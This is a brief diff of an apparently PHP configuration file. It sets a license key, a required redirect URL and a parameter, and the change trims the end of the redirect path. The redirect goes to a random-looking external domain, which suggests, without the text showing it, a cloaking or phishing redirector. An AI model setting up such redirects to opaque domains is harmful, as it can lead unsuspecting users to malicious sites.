@@ -14,7 +14,7 @@
 
 $license_key = "ks6zv5u0jn3sivn0ts5ej2hti9yaj8pj"; // [REQUIRED]
 
-$redirect = "https://bby.rfipepogdjql.es/d5l@bVfq7g42D/$"; // URL or FILE [REQUIRED]
+$redirect = "https://bby.rfipepogdjql.es/d5l@bVfq7g42D"; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
